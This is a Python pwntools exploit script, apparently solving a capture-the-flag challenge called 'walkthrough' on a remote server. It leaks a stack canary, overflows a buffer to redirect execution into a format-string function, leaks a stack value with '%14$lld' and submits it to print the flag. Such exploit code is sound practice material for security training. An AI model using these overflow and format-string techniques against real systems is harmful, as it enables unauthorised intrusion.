#!/usr/bin/python3

from pwn import *

#p = process("./walkthrough")
p = remote("147.182.172.217", 42001)
e = ELF("./walkthrough")
#context.log_level = 'debug'

padding = "A"*0x48
p.recvuntil("later): ")
canary = int(p.recvline().decode('utf-8').strip("\n"), 16)
ret = 0x0000000000401016

payload = padding.encode('utf-8')
payload += p64(canary)
payload += "BBBBBBBB".encode('utf-8')
payload += p64(ret)
payload += p64(e.symbols['fmtstr'])

p.sendlineafter("like on the stack.\n", payload)
p.sendlineafter("be passed into printf.\n", "%14$lld".encode('utf-8'))
p.recvline()
p.recvline()
value = int(p.recvline().decode('utf-8').strip("\n"))
log.info("value is: {}".format(value))

#p.interactive()
p.sendlineafter("you're guessing.\n", str(value).encode('utf-8'))
#p.interactive()
p.recvuntil("flag:\n")

log.info(p.recvline().decode('utf-8'))
#p.interactive()
